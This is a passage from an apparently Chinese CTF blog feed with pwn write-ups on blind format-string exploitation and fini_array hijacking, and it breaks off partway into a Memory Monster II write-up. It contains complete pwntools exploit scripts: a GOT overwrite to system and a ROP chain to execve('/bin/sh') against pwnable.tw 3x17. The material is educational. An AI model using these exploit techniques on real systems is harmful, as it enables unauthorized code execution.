class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : leakmemory_64_remote.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p64(addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    resp = p.recvuntil(<span class="string">&quot;.TMP&quot;</span>)</span><br><span class="line">    ret = resp[:-<span class="number">4</span>:]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = p.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x4006B0</span></span><br><span class="line">printf_got_plt = <span class="number">0x601030</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;moxiaoxi&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf@got</span></span><br><span class="line">payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p64(printf_got_plt+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">printf_got = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;\x00&#x27;</span>)&lt;&lt;<span class="number">8</span></span><br><span class="line">log.info(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcdatabase</span></span><br><span class="line">libc_base = printf_got - <span class="number">0x055800</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + <span class="number">0x045390</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">one = p64(system_addr)[:<span class="number">2</span>]</span><br><span class="line">two = p64(system_addr&gt;&gt;<span class="number">16</span>)[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%9104c%12$hn%54293c%13$hn&quot;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line">payload += p64(printf_got_plt) + p64(printf_got_plt+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="更多实例"><a href="#更多实例" class="headerlink" title="更多实例"></a>更多实例</h2><ul><li><p>axb_2019_fmt32</p><p>BUU 上有实验环境，忽略提供的二进制文件，就是盲打题目</p></li><li><p>axb_2019_fmt64</p><p>BUU 上有实验环境，忽略提供的二进制文件，就是盲打题目</p></li><li><p>SuCTF2018 - lock2 </p><p>主办方提供了 docker 镜像: suctf/2018-pwn-lock2</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh">ctf-wiki</a></li><li><a href="https://momomoxiaoxi.com/2017/12/26/Blindfmtstr/">leak me</a></li><li><a href="https://luobuming.github.io/2019/10/17/2019-10-17-pwn-%E7%9B%B2%E6%89%93/#64%E4%BD%8D%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95">pwn-盲打</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 合天 </tag>
            
            <tag> Blind_pwn </tag>
            
            <tag> 格式化字符串盲打 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持64位静态程序fini_array进行ROP攻击</title>
      <link href="archives/2a024eda/"/>
      <url>archives/2a024eda/</url>
      
        <content type="html"><![CDATA[<h2 id="程序起点"><a href="#程序起点" class="headerlink" title="程序起点"></a>程序起点</h2><p>程序的启动流程如图所示：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-gAfdEK02MtTbddaQ.png"></p><p>可以看到 main 函数不是程序起点，之前写的 格式化字符串盲打 也分析过 text 段起点是 _start 函数 。_start 函数调用__libc_start_main 完成启动和退出工作。具体看看 _start 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A60                 <span class="keyword">public</span> start</span><br><span class="line">.text:<span class="number">0000000000401</span>A60 start           proc near               ; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401</span>A60 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401</span>A60                 <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">.text:<span class="number">0000000000401</span>A62                 mov     r9, rdx</span><br><span class="line">.text:<span class="number">0000000000401</span>A65                 pop     rsi</span><br><span class="line">.text:<span class="number">0000000000401</span>A66                 mov     rdx, rsp</span><br><span class="line">.text:<span class="number">0000000000401</span>A69                 <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line">.text:<span class="number">0000000000401</span>A6D                 push    rax</span><br><span class="line">.text:<span class="number">0000000000401</span>A6E                 push    rsp</span><br><span class="line"><span class="comment">// 以此将 fini、init、main 地址压入寄存器</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.text:<span class="number">0000000000401</span>A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.text:<span class="number">0000000000401</span>A7D                 mov     rdi, offset main</span><br><span class="line">.text:<span class="number">0000000000401</span>A84                 db      <span class="number">67</span>h</span><br><span class="line">.text:<span class="number">0000000000401</span>A84                 call    __libc_start_main</span><br><span class="line">.text:<span class="number">0000000000401</span>A8A                 hlt</span><br><span class="line">.text:<span class="number">0000000000401</span>A8A ; &#125; <span class="comment">// starts at 401A60</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A8A start           endp</span><br></pre></td></tr></table></figure><p><a href="https://refspecs.linuxfoundation.org/LSB_4.0.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">__libc_start_main 定义原型</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **), <span class="keyword">int</span> argc, <span class="keyword">char</span> ** ubp_av, <span class="keyword">void</span> (*init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*stack_end));</span><br></pre></td></tr></table></figure><p>根据 64 位传参特定得出对应寄存器值。这个执行顺序我是通过调试得出来的。（__libc_csu_init 的话是 ret2csu 利用对象。）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi &lt;- main</span><br><span class="line">rcx &lt;- __libc_csu_init    <span class="comment">//在main函数前执行</span></span><br><span class="line">r8 &lt;- __libc_csu_fini    <span class="comment">//在main函数后执行</span></span><br></pre></td></tr></table></figure><h2 id="libc-csu-fini-函数"><a href="#libc-csu-fini-函数" class="headerlink" title="__libc_csu_fini 函数"></a>__libc_csu_fini 函数</h2><p>__libc_csu_fini 函数是 main 函数退出返回到 __libc_start_main 后，通过 __libc_start_main 调用的。具体看看函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000402960</span> __libc_csu_fini proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:<span class="number">0000000000402960</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000402960</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000402961</span>                 lea     rax, unk_4B4100</span><br><span class="line">.text:<span class="number">0000000000402968</span>                 lea     rbp, _fini_array_0</span><br><span class="line">.text:<span class="number">000000000040296F</span>                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000402970</span>                 sub     rax, rbp</span><br><span class="line">.text:<span class="number">0000000000402973</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000402977</span>                 sar     rax, <span class="number">3</span></span><br><span class="line">.text:<span class="number">000000000040297B</span>                 jz      <span class="keyword">short</span> loc_402996</span><br><span class="line">.text:<span class="number">000000000040297</span>D                 lea     rbx, [rax<span class="number">-1</span>]</span><br><span class="line">.text:<span class="number">0000000000402981</span>                 nop     dword ptr [rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000402988</span></span><br><span class="line">.text:<span class="number">0000000000402988</span> loc_402988:                             ; CODE XREF: __libc_csu_fini+<span class="number">34</span>↓j</span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br><span class="line">.text:<span class="number">000000000040298</span>C                 sub     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000402990</span>                 cmp     rbx, <span class="number">0F</span>FFFFFFFFFFFFFFFh</span><br><span class="line">.text:<span class="number">0000000000402994</span>                 jnz     <span class="keyword">short</span> loc_402988</span><br><span class="line">.text:<span class="number">0000000000402996</span></span><br><span class="line">.text:<span class="number">0000000000402996</span> loc_402996:                             ; CODE XREF: __libc_csu_fini+<span class="number">1B</span>↑j</span><br><span class="line">.text:<span class="number">0000000000402996</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040299</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040299B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040299</span>C                 jmp     sub_48E32C</span><br><span class="line">.text:<span class="number">000000000040299</span>C ; &#125; <span class="comment">// starts at 402960</span></span><br><span class="line">.text:<span class="number">000000000040299</span>C __libc_csu_fini endp</span><br></pre></td></tr></table></figure><p>注意以下这三行源码，是劫持 fini_array 实现无限写进行 ROP 的关键：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 fini_array[0] 的值加载到 rbp</span></span><br><span class="line">.text:<span class="number">0000000000402968</span>                 lea     rbp, _fini_array_0</span><br><span class="line"><span class="comment">//经过一系列运算后，这里会 call fini_array[1] ，也就是调用存储在 fini_array[1] 的指针</span></span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br><span class="line"><span class="comment">//调用完 fini_array[1] 之后再次进过一系列运算，这里会 call fini_array[0]</span></span><br><span class="line">.text:<span class="number">0000000000402988</span>                 call    qword ptr [rbp+rbx*<span class="number">8</span>+<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>看一下 fini_array 的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:00000000004B40F0 _fini_array     segment para public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                 assume cs:_fini_array</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                 ;org <span class="number">4B</span>40F0h</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0 _fini_array_0   dq offset sub_401B00    ; DATA XREF: .text:<span class="number">000000000040291</span>C↑o</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                                         ; __libc_csu_fini+<span class="number">8</span>↑o</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F8                 dq offset sub_401580</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F8 _fini_array     ends</span><br></pre></td></tr></table></figure><p>这里明确知道了 fini_array 里面存储了两个指针，调用顺序为：先 fini_array[1] ，再 fini_array[0] 。那么**如果我们把 fini_array[1] 覆盖为函数 A 的地址，fini_array[0] 覆盖为 __libc_csu_fini 的地址 **，当退出 main 后，程序会这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini</span><br><span class="line"></span><br><span class="line">__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini</span><br><span class="line"></span><br><span class="line">__libc_csu_fini先执行一遍fini_array[1]:addrA，返回后再执行fini_array[0]:__libc_csu_fini</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这个循环就会一直持续到 fini_array[0] 被覆盖为其他值。</p><p>还有个点就是上面提到的源码中的 <code>lea     rbp, _fini_array_0</code> ，将 rbp 的值修改为 fini_array[0] 所在的地址，那么配合 <code>leave|ret</code> 就能将栈迁移到 fini_array + 0x10 的地址，我们就将利用函数放在这个地方。</p><h2 id="pwnable-tw-3x17"><a href="#pwnable-tw-3x17" class="headerlink" title="pwnable.tw-3x17"></a>pwnable.tw-3x17</h2><h3 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h3><p>静态链接的 64 位程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skye:~/CTF学习/fini_array劫持$ file 317</span><br><span class="line">317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped</span><br></pre></td></tr></table></figure><p>checksec 检查是没有 canary 但是根据汇编去检查<strong>是有 canary 保护</strong>的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-07-dmQW7YTLcYVKJeGN.png"></p><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，或者通过字符串定位到 main 函数位置（shift+F12）。</p><p>main 函数中一个任意地址写入 0x18 的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重命名部分函数名</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write_fun(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    read_fun(<span class="number">0</span>, &amp;buf, <span class="number">0x18</span>uLL);<span class="comment">//读取地址</span></span><br><span class="line">    v4 = (<span class="keyword">char</span> *)(<span class="keyword">signed</span> <span class="keyword">int</span>)sub_40EE70((__int64)&amp;buf);</span><br><span class="line">    write_fun(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    read_fun(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);<span class="comment">//向读取地址写入内容</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v6 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><p>这条题目还有其他解法，因为用这条题目学习 <strong>fini_array 劫持</strong>就记录这种做法。其他解法：<a href="https://kirin-say.top/2019/02/08/pwnable-tw-3x17/">pwnable.tw_3x17</a></p></blockquote><p>静态编译程序只能用它的有东西 getshell 。写 shellcode 估计要 mprotect 给内容加上运行权限绕过 NX 保护；写个系统调用号可行一点。</p><p>那就需要用到写入功能函数了，如果需要符合本文学习内容，就需要一个任意地址写的函数，刚好 main 函数就是。现在明确思路：</p><ol><li><p>将 fini_array[1] 覆盖为 main 函数地址；fini_array[0] 覆盖为 __libc_start_fini 地址；</p></li><li><p>依次向 fini_array + 0x10 写入系统调用号利用代码；</p></li><li><p>写入完成后，将 fini_array[0] 覆盖为 <code>leave|ret</code>，将栈迁移到 fini_array + 0x10;</p></li></ol><blockquote><p>构建的系统调用命令：syscall(0x3b,addr_of_binsh,0,0)</p><p>相当于：execve(addr_of_binsh,0,0)</p><p>系统调用号查询：<a href="https://www.mrskye.cn/archives/168/">https://www.mrskye.cn/archives/168/</a></p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./317&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line">elf = process(<span class="string">&quot;./317&quot;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">esp = fini_array + <span class="number">0x10</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"> </span><br><span class="line">rop_syscall = <span class="number">0x471db5</span></span><br><span class="line">rop_pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">rop_pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">rop_pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B419A</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(data)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># hijack fini_array</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    write(fini_array,p64(libc_csu_fini) + p64(main_addr))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># rop chain</span></span><br><span class="line">    write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    write(esp,p64(rop_pop_rax))</span><br><span class="line">    write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">    write(esp+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">    write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">    write(esp+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">    write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write(esp+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">    write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write(esp+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># stack pivoting</span></span><br><span class="line">    write(fini_array,p64(leave_ret) + p64(ret))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://bbs.pediy.com/thread-259298.htm">[原创]pwnable.tw新手向write up(二) 3×17-x64静态编译程序的fini_array劫持</a></li></ul><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><blockquote><p>题目来源 DASCTF 五月赛，作者为 TaQini ，[附件]([<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory%20Monster%20II]">https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory%20Monster%20II]</a>(<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory">https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory</a> Monster II))</p><p>这里和上面那条机会一样，下面是独立完成，详细记录一下</p></blockquote><h3 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h3><p>checksec 检查是没有 canary 但是根据汇编去检查<strong>是有 canary 保护</strong>的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，没有卵用只修复了两个函数，但是能看到 _start 函数：（重命名部分函数）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>00                 <span class="keyword">public</span> start</span><br><span class="line">.text:<span class="number">0000000000401B</span>00 start           proc near               ; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401B</span>00 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>00                 <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">.text:<span class="number">0000000000401B</span>02                 mov     r9, rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>05                 pop     rsi</span><br><span class="line">.text:<span class="number">0000000000401B</span>06                 mov     rdx, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>09                 <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line">.text:<span class="number">0000000000401B</span>0D                 push    rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>0E                 push    rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>0F                 mov     r8, offset __libc_start_fini</span><br><span class="line">.text:<span class="number">0000000000401B</span>16                 mov     rcx, offset __libc_start_init</span><br><span class="line">.text:<span class="number">0000000000401B</span>1D                 mov     rdi, offset main</span><br><span class="line">.text:<span class="number">0000000000401B</span>24                 db      <span class="number">67</span>h</span><br><span 